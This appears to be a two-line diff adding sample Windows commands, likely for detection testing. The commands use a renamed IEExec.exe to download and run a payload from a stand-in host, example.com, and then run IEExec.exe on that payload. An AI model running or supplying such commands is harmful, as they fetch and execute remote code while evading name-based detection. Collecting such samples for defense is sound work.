@@ -1,0 +1,2 @@
+copy IEExec.exe not_ieexec.exe && not_ieexec.exe http://example.com/payload.exe
+IEExec.exe payload.exe
